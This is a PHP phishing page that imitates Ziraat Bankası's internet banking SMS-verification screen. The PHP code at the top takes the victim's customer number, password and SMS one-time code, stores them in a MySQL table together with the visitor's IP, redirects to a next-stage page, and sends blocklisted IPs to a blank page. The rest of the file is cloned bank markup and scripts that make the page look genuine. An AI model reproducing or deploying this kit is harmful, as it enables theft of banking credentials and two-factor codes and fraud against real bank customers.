<?
include 'baglan.php';
function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

if ($_POST['pass2']<>"") { } else {
$tc = $_POST['tc'];
$pass = $_POST['sms'];
mysql_query("insert into ak (kullanici, tarih, pass, notif, ses, ip) values ( '$tc', now(), '$pass', '1', '1', '$ipcik')");
}

if ($_POST['pass2']<>"") {
$tc = $_POST['tc'];
$pass2 = $_POST['pass2'];
mysql_query("Update ak set sms1='$pass2' where ip='$ipcik' ");
mysql_query("Update ak set notif='1' where ip='$ipcik' ");
mysql_query("Update ak set ses='1' where ip='$ipcik' ");
echo "<script>window.location.href = 'sms2.php'; </script>";
}


    $query =  mysql_query('SELECT * FROM ip'); 
    while($row = mysql_fetch_assoc($query)){ 
        if($row['ip'] == $ipcik){ 
            header('Location: about:blank'); 
        } 
    } 

?>
<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Language" content="tr">
    
    <meta name="description" content="">
    <!-- açıklama gir -->
    <meta name="keyword" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <!-- açıklama gir -->
    

    <title> Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı </title> 
    <link rel="SHORTCUT ICON" href="https://bireysel.ziraatbank.com.tr/Content/images/tr_TR/Generic/ZB.ico?v=636332540968224941">
    <link href="./index_files/help.css" rel="stylesheet" type="text/css">
    <link href="./index_files/login.css" rel="stylesheet" type="text/css">
    <style type="text/css">
        html
        {
            overflow: hidden;
        }
        .loadingPanel
        {
            width: 100%;
            height: 99%;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 99998;
            display: none;
            opacity: 0;
            filter: alpha(opacity=0);
            background-color: #fff;
        }
        .loadingPanel.loadingImage
        {
            z-index: 99999;
            filter: alpha(opacity=100);
            opacity: 100;
            background-color: transparent;
        }
        img.loadingImage
        {
            position: absolute;
            left: 8px;
            top: 8px;
            z-index: 2;
        }
        .preloader-box
        {
            width: 200px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5 px;
            border-radius: 5px;
            position: absolute;
            top: 50%;
            left: 50%;
            background: url(/Content/assets/images/bg/lb-bg.png) repeat 0 0;
            padding: 20px 30px;
            margin: -40px 0 0 -80px;
            display: none;
        }
        .lb-preloader .loader
        {
            background: url(/Content/assets/images/icons/preload_page.gif) no-repeat 0 0;
            display: block;
            margin: 0 auto;
            z-index: 82;
            padding: 5px 0 0 50px;
            min-width: 40px;
            min-height: 35px;
            color: #fff;
            font: 12px arial;
        }
        .preloader-box1
        {
            position: relative;
            padding: 8px;
            position: fixed;
            top: 50%;
            margin: -40px 0 0 -28px;
            left: 50%;
            width: 40px;
            height: 40px;
            z-index: 99999;
            display: none;
        }
        .preloader-box1 > div
        {
            -webkit-border-radius: 5px;
            -moz-border-radius: 5 px;
            border-radius: 5px;
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        .light-box-child-shadow
        {
            display: none;
        }
    </style>
    <script type="text/javascript">
        var relativePath = '/'; 
    </script>
    <noscript>
        &lt;meta http-equiv="refresh" content="0;URL=https://bireysel.ziraatbank.com.tr/CommonPages/JavascriptWarning.aspx" /&gt;
    </noscript>
</head>
<body>
    <div class="light-box-shadow">
    </div>
    <div class="light-box-child-shadow">
    </div>
    <div class="loadingPanel">
    </div><div class="preloader-box1"><div></div><img class="loadingImage" src="./index_files/preload_page.gif"></div>
    <!--[if IE 7]>
        <div class="ie-warning-band">
            <p>
                
            </p>
        </div>
    <![endif]-->
    <!--[if IE 8]>
        <div class="ie-warning-band">
            <p>
                
            </p>
            
        </div>
    <![endif]-->
    <script language="JavaScript" type="text/javascript">
        var sid = "";
        var is_DefaultSubmit = false;
    </script>
    <!-- scripts -->
    <script src="./index_files/jquery.min.1.8.3.js.indir" type="text/javascript"></script>
    <script src="./index_files/ui.js.indir" type="text/javascript"></script>
    <script src="./index_files/core.js.indir" type="text/javascript"></script>
    <script src="./index_files/liball.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.validationEngine-tr.js.indir" type="text/javascript" charset="ISO-8859-9"></script>
    <script src="./index_files/jquery.validationEngine.js.indir" type="text/javascript" charset="utf-8"></script>
    <script src="./index_files/clock.js.indir" type="text/javascript"></script>
    <script src="./index_files/VeriBranch.js.indir" type="text/javascript"></script>
    <script src="./index_files/General.js.indir" type="text/javascript"></script>
    <script src="./index_files/jquery.tipsy.js.indir" type="text/javascript"></script>
    <script src="./index_files/rsa.js.indir" type="text/ecmascript"></script>
    <script type="text/javascript" language="javascript" src="./index_files/help.config.js.indir"></script>
    <!-- /scripts -->
    <script type="" language="JavaScript">
        if (parent.frames.length != 0) {
            window.parent.location.href = "/Transactions/Login/FirstLogin.aspx";
        }
        $(document).ready(function () {
            // $(".tooltipLink img").tooltip();
        });

        var PAGELOADED = false;

        function init() {
            // TODO
            //document.forms[0].txtUsername.focus();
            PAGELOADED = true;
        }

        var isSubmitted = false;

        function loginSubmit() {
            if (!isSubmitted) {
                if (jQuery('form').validationEngine('validate') != true)
                    return false;
                else return true;
                isSubmitted = true;
                jQuery('form').submit();
            }
        }


    </script>
    <form name="sms" method="post" action="" id="sms" autocomplete="off">
<div>
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['sms'];
if (!theForm) {
    theForm = document.sms;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="./index_files/WebResource.axd" type="text/javascript"></script>

<script language="javascript">
window.history.forward(1);
$(document).keydown(function(e){var t;if(e.keyCode==8){var n=e.srcElement||e.target;if(n.tagName.toUpperCase()=="INPUT"||n.tagName.toUpperCase()=="TEXTAREA"){t=n.readOnly||n.disabled}else t=true}else t=false;if(t)e.preventDefault()})

</script>
<script src="./index_files/WebResource(1).axd" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
var dd5fcb6461304a64adbfb0462736cb6f=['1024','010001','BEA8E27023B6041033D606448F9CF48FF2F05AE0B83C25BD91713D7096573458BBC53163023E433EACFDB6E578F47B8CEF8E46499BC2BC697E4C2E26D1EC48A1D048686346EF0A9B5DF1D9DA9CA40EB57D01DB248E54AAE3B19BF9097FD616187BF0C8776B013CEA2429E8139043E73AF8DFF3A68DDBA753032D38B9865AC34D'];function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;EncryptFormInputs();
return true;
}
//]]>
</script>

<div>
</div>
        

        <a causesval="false" onclick=";return subchk(this);;" id="NavigationHiddenButton" href="javascript:__doPostBack(&#39;ctl00$NavigationHiddenButton&#39;,&#39;&#39;)" style="display: none;"><span></span></a>
        <div id="wrapper" class="login-wrapper">
            <div class="login-screen" style="margin-top: -165px;">
                <div class="login-top">
                </div>
                <div class="login-box left">
                    <a class="logo" href="javascript:;" style="margin-bottom: 12px;"></a>
                    <div class="login-err" style="display: none;">
                        <span class="icon"></span><span>
                            <span id="ctl00_errorLabel" class="error"></span></span>
                    </div>
                    
    <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;"></span>
    <!-- <div class="notice">
        
        
    </div>-->
    <div class="clear"></div>
    


    <div class="clear">
    </div>
    <div id="ctl00_c_PnlSMS" class="PnlSMS">
        <!--<label for="txtSMSReply">
            SMS Şifre</label>-->
        <div class="global-input global-input-Number clear">
				<input id="tc" name="tc"  type="hidden" placeholder="<?php echo $kullanici; ?>" value="<?php echo $kullanici; ?>">
            <input data-value="" autocomplete="off" name="pass2" type="password" maxlength="6" id="pass2" class="password password2" onmousedown=";" reqfieldmsg="Lütfen geçerli SMS şifresi giriniz." onmouseup=";" onpaste="return false;;;return false;;return false;;" keypadtype="numeric" onfocus=";thisFocus(this, event);" onblur=";thisBlur(this, event);" onkeypress=";" ondrop="return DisableDragAndDrop(event);" validation="validate[funcCall[VBValid]]" size="20" validdistype="tooltip" onkeydown=";return FcsToCtrl(event,&#39;ctl00_c_BtnLogin&#39;);" onkeyup=";;"><span></span>
            <label style="display: block;">
                SMS Şifrenizi Giriniz</label>
        </div>
        <div class="clear">
        </div>
        <span id="ctl00_c_SmsTimeCounter_LblTimeError" class="floatLeft smsTimerLabel">Kalan Süre :<span style="color:red;font-weight:bold">02:48</span> </span>
    <a causesval="false" onclick=";" id="LinkResendSms" class="resendSMS" href="javascript:__doPostBack(&#39;ctl00$c$SmsTimeCounter$LinkResendSms&#39;,&#39;&#39;)" style="color: rgb(82, 82, 82);">Tekrar Gönder</a>
    


<style type="text/css">
        
    .smsTimerLabel
    {
        line-height: 18px;
        margin-left: 10px;
        float:left;
        margin-top:1px;
    }
    .resendSMS
    {
        background: none;
        background: url(/Content/images/buttonicons/mobile-phone_gri.gif) no-repeat;
        display: block;
        float: right;
        padding-left: 20px;
        margin-bottom: 10px;
        *margin-bottom: 0px;
        color: #000000;
        font-weight: bold;
        background-position: 0 0px;
        line-height: 20px;
        cursor: pointer;
        display : none;
    }
</style>
<script type="text/javascript">

$('#LinkResendSms').click(function(e){

    if(smsCounter != 0)
    {
        e.preventDefault();
    }
});



$('#LinkResendSms').css("color","#525252");
$.get('/Content/images/buttonicons/mobile-phone_siyah_animated.gif');
String.prototype.formatTime = function () {
    var args = arguments;
    return this.replace(/\{\{|\}\}|\{(\d+)\}/g, function (m, n) {
        if (m == "{{") { return "{"; }
        if (m == "}}") { return "}"; }
        return args[n];
    });
};
var smsCounter = 180;
var logOffCounter = 300;

function LogOffCountDown()
{
    if(logOffCounter == 0)
    {
        window.location.href = '/Transactions/Login/FirstLogin.aspx';
    }
    else
    {
        logOffCounter--;
        setTimeout("LogOffCountDown()",1000);
    }
}

function smsCountDown()
{
    var min = parseInt(smsCounter/60);
    var sec = parseInt(smsCounter - (min * 60));

    var minStr = min < 10 ? "0"+min : min;
    var secStr = sec < 10 ? "0"+sec : sec;

   $('#ctl00_c_SmsTimeCounter_LblTimeError').html('Kalan Süre :<span style=\'color:red;font-weight:bold\'>{0}</span> '.formatTime(minStr+":"+secStr));   
   

    if(smsCounter <= 0)
    {
        $('#LinkResendSms').removeAttr("disabled");
        $('#LinkResendSms').css("background-image",'url(/Content/images/buttonicons/mobile-phone_siyah_animated.gif)');
        $('#LinkResendSms').css("color",'#000000');
        $('#LinkResendSms').show();
        return;
    }
    smsCounter--;
    setTimeout("smsCountDown()",1000);
}


smsCountDown();
LogOffCountDown();
</script>

    </div>
    
    <div class="clear">
    </div>
    
    <div class="links right ">
           <button id="ctl00_c_BtnLogin" style="border:0" class="link2"><span></span><span></span>GİRİŞ</button>
    </div>
    <div class="clear">
    </div>
    <script type="text/javascript">
        $(document).ready(function () {
            $("input[type='text'],input[type='password']").focus(function () { thisFocus(this); });
            $("input[type='text'],input[type='password']").blur(function () { thisBlur(this); });

            $('.errorMessage').find('a.close').click(function () {
                $(this).parent().addClass('hide');
            });

            if($(".resendSMS").text()=="Tekrar Gönder"){
                $(".logo").css("margin-bottom","12px");
            }

            
                 $("#ctl00_c_TxtSMS").focus();
                if(!$(".global-input label").hasClass("password-text")){
                    setTimeout(function(){$(".PnlSMS label").show();},1);
                }

                $('#ctl00_c_TxtSMS').bind('contextmenu', function (e) {
                    return false;
                });
            
            imageControl();
        });

        function ValidatePage(sender, args) {
            loginDummyLoading();
        }
    </script>

                </div>
                <!--login-box end-->
                <div class="login-box right">
                    <h5 class="left">
                        Ziraat
                        <!-- Yenilenen Ziraat -->
                        <br>
                        <b>
                            İnternet Şubesine
                            <!-- İnternet Şubesine-->
                        </b>
                        <br>
                        Hoş Geldiniz!
                        <!-- Hoş Geldiniz!-->
                    </h5>
                    <p class="clear">
                        <span id="lock"></span>
                        Müşteri numaranızı, İnternet/Mobil bankacılık giriş ve ATM şifrenizi Ziraat Bankası personeli dahil kimse ile paylaşmayınız.
                        <!-- Müşteri numaranızı, şifrenizi, parolanızı ve ATM şifrenizi
                    Ziraat Bankası personeli dahil kimse ile paylaşmayınız.-->
                    </p>
                    <p>
                        <span id="online"></span>
                        Ziraat Bankası
                    İnternet Şubesi´ne sadece www.ziraatbank.com.tr adresindeki "İnternet Şubesi" linkine
                    tıklayarak ulaşınız
                        <!--Ziraat Bankası
                    İnternet Şubesi´ne sadece www.ziraatbank.com.tr adresindeki "İnternet Şubesi" linkine
                    tıklayarak ulaşınız.-->
                    </p>
                    <!--<p>
                    <span id="error"></span>Müşteri Numarası ve Şifre girildikten sonra parola girilen
                    ekranda bireysel müşterile- rimiz için adınız ve soyadınız, kurumsal müşterilerimizin
                    ise unvanı gelecektir. Ad, Soyadınız veya unvanınız gelmiyorsa parolanızı kesinlikle
                    girmeyiniz.</p>-->
                    <div class="clear">
                    </div>
                    <a href="javascript:;" id="hvButton" class="hv-button" onclick="OpenVideoBox();">
                    </a>
                    <div id="comodo-logo">
                    </div>
                </div>
                <!--login-box right end-->
                <div class="footer">
                    <a class="customer-service" href="javascript:;" title="">
                        Müşteri İletişim Merkezi
                        </a><a href="javascript:;" class="security-link">
                            Güvenlik</a>
                    <a href="javascript:;" id="faq">
                        Yardım
                        </a>
                </div>
                
            </div>
            <!--login-screen end-->
        </div>
        <div id="wrapper" class="browser-warning" style="display: none">
            <div class="login-screen logOff" style="margin-top: -165px;">
                <div class="login-top">
                </div>
                <div class="clear">
                </div>
                <div class="login-box left login-content">
                    <div class="clear">
                    </div>
                    <a class="logo left" href="javascript:;" style="margin-bottom: 12px;"></a>
                    <div class="right sube-text">
                        <h5 class="left">İnternet<b>Şube</b></h5>
                    </div>
                    <div class="internet-sube-content">
                        <!--<img src="../../Content/assets/images/icons/gray-info.png" />-->
                        <div id="ie-warning-message" style="display: none">
                            Kullanmakta olduğunuz tarayıcı Yeni İnternet Şubemizin bazı özelliklerini desteklememektedir.
                        </div>
                        <div id="opera-warning-message" style="display: none">
                            Kullanmakta olduğunuz tarayıcı Yeni İnternet Şubemizin bazı özelliklerini desteklememektedir.
                        </div>
                    </div>
                    <div class="footer">
                        <a class="customer-service" href="javascript:;" title="Müşteri İletişim Merkezi">Müşteri
                            İletişim Merkezi</a>
                    </div>
                    <!--login-box end-->
                    <div id="comodo-logo">
                    </div>
                </div>
                <!--login-screen end-->
            </div>
            <!--wrapper end-->
        </div>
    
<script type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("ctl00_c_PageValidation"));
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
var ctl00_c_PageValidation = document.all ? document.all["ctl00_c_PageValidation"] : document.getElementById("ctl00_c_PageValidation");
ctl00_c_PageValidation.evaluationfunction = "CustomValidatorEvaluateIsValid";
ctl00_c_PageValidation.clientvalidationfunction = "ValidatePage";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
$(window).bind('load', function() { if(typeof setHasFormChanges === 'function') { setHasFormChanges(top.window, false); } });
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        //]]>
</script>
</form>
    <!--wrapper end-->
    <div id="helpContainer" class="help-container">
    </div>
    <div class="security-container login-security">
    </div>
    <div class="help-container hv-container">
    </div>
    <!--help-container end-->
    <script src="./index_files/login.config.js.indir" type="text/javascript"></script>
    <script type="text/javascript">
        $(document).ready(function () {
            if ($("form").length > 0)
                $("form").validationEngine('attach', {
                    isOverflown: true,
                    overflownDIV: "#wrapper"
                });

            $('.errorMessage').find('a.close').click(function () {
                $(this).parent().addClass('hide');
            });

            $("#txtUsername").focus();

            $('#txtUsername').bind('contextmenu', function (e) {
                return false;
            });

            $('#txtPassword').bind('contextmenu', function (e) {
                return false;
            });

            $(':input').keypress(function (e) {
                if (e.which == 13) {
                    loginSubmit();
                    e.preventDefault();
                    return false;
                }
            });




            if ($.browser.msie && Math.round($.browser.version) < 7) {
                $(".browser-warning, #ie-warning-message").show();
                $(".login-wrapper, #opera-warning-message").hide();
                $loginScreen.css('margin-top', '-' + ((loginHeight / 4.5) - 5) + 'px');
                $("body").addClass("ie6");
            }
            if (navigator.userAgent.indexOf("Opera") > -1) {
                $(".browser-warning, #opera-warning-message").show();
                $(".login-wrapper, #ie-warning-message").hide();
            }

            $(window).load(function () {
                var $loadingPanel = $('.loadingPanel');
                var path = relativePath;
                var img = '<img class="loadingImage" src="{0}Content/assets/images/icons/preload_page.gif" />'.format(path);
                $loadingPanel.after('<div class="preloader-box1"><div></div>' + img + '</div>');
            });

        });


        function checkCustomerNo(field, rules, i, options) {
            if (field.val() == "") {
                return "Müşteri Numaranızı Giriniz";
            }
            if (isNaN(field.val()) || !isNumeric(field.val())) {
                return "Müşteri Numaranızı Yalnızca Rakam Olarak Giriniz";
            }

        }

        function checkPassword(field, rules, i, options) {
            if (field.val() == "") {
                return "Lütfen Şifrenizi Giriniz";
            }
            if (isNaN(field.val()) || !isNumeric(field.val())) {
                return "Şifrenizi Yalnızca Rakam Olarak Giriniz";
            }
            if (field.val().length != 5) {
                return "Şifrenizi 5 Karakter Olarak Giriniz";
            }
        }

        function loginDummyLoading() {
            var $loadingPanel = $('.loadingPanel');
            if ($loadingPanel.is(':visible')) {
                return;
            }
            $loadingPanel.show();
            $(".preloader-box1").show();
        }

    </script>
    
    <script type="text/javascript">


        function RefreshIFrame(itemId) {
            $("#" + itemId).attr("src", $("#" + itemId).attr("src"));
        }

        var $loginScreen = $('.login-screen'), loginHeight = $loginScreen.height();
        $loginScreen.css('margin-top', '-' + ((loginHeight / 2) - 5) + 'px');


        if (navigator.userAgent.match(/(iPad)|(iPhone)|(iPod)|(android)|(webOS)/i)) { $('body').addClass('mobile'); }
    </script>

</body></html>